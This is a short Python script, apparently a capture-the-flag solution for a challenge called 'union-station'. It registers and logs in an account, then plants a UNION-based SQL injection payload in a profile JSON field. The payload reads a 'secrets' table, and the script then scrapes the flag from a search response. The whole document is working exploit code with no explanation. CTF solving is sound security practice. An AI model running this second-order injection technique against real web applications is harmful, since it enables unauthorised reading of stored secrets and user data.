import requests
import json
import re

url = 'https://union-station.asrctf.online/'
s = requests.Session()

creds = {
    'username': 'hacked',
    'password': 'hacked'
}

res = s.post(f'{url}/register', data=creds)
res = s.post(f'{url}/login', data=creds)

res = s.post(f'{url}/update_profile', data={
    'profile_json': json.dumps({
        'connector': 'UNION SELECT value, 1, 1 from secrets --'
    })
})

res = s.post(f'{url}/api/search')

flag = re.findall(r'(ASRCTF{.+?})', res.text)[0].strip()
print("Flag:", flag)